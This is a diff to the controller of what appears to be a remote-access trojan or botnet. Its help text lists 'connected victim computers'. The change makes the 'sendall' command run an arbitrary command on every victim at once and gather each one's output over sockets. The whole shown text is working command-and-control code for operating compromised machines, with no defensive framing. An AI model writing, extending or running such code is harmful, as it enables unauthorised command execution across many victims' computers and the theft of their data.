@@ -48,7 +48,7 @@ def show_center_help():
     print(GREEN + "\nAvailable Commands:" + RESET)
     print(YELLOW + "  targets" + RESET + "         - List all connected victim computers")
     print(YELLOW + "  session <#>" + RESET + "     - Connect to a specific victim (e.g., 'session 0')")
-    print(YELLOW + "  sendall <cmd>" + RESET + "   - Send a command to ALL victims at once")
+    print(YELLOW + "  sendall <cmd>" + RESET + "   - Send a command to ALL victims at once and returns their outputs")
     print(YELLOW + "  help" + RESET + "            - Show this help menu")
     print(YELLOW + "  quit" + RESET + "            - Close all connections and exit the program\n")
 
@@ -267,10 +267,41 @@ while True:                                                 # Keep showing the c
     # ------------------
     # Sends the same command to ALL victims at once
     elif command[:7] == 'sendall':
+        cmd = command[8:]                                   # Get the command you typed (the part after 'sendall ')
+
+        if cmd.strip() == '':                               # Check if command is empty
+            print(RED + '[!] No command provided' + RESET)
+            continue
+
         try:
-            sendtoall(targets, command)                     # Send command to everyone
-        except:                                             # If sending failed for some reason
-            print(RED + '[!] Send to all failed' + RESET)   # Error message in RED
+            sendtoall(targets, cmd)                         # Send command to everyone
+            print(GREEN + f'[+] Command sent to {len(targets)} target(s)' + RESET) # Success message in GREEN!
+            
+            # Collect responses from all targets
+            for i, target in enumerate(targets):            # Go through each victim one by one
+                try:
+                    target.settimeout(5)                    # Wait max 5 seconds for response
+                    json_data = ''                          # Start with empty response
+                    while True:                             # Keep trying until we get a complete message
+                        try:
+                            json_data += target.recv(1024).decode('utf-8')
+                            result = json.loads(json_data)
+                            break
+                        except ValueError:
+                            continue
+                    
+                    print(YELLOW + f'\n--- Response from Session {i} ({ips[i][0]}) ---' + RESET)
+                    print(result)
+                    
+                except socket.timeout:
+                    print(RED + f'[!] Session {i} timed out' + RESET)
+                except Exception as e:
+                    print(RED + f'[!] Error receiving from Session {i}: {str(e)}' + RESET)
+            
+            print(GREEN + '\n[+] All responses received' + RESET)
+            
+        except Exception as e: # If sending failed for some reason
+            print(RED + f'[!] Send to all failed: {str(e)}' + RESET) # Error message in RED
     
     # ------------------
     # UNKNOWN COMMAND
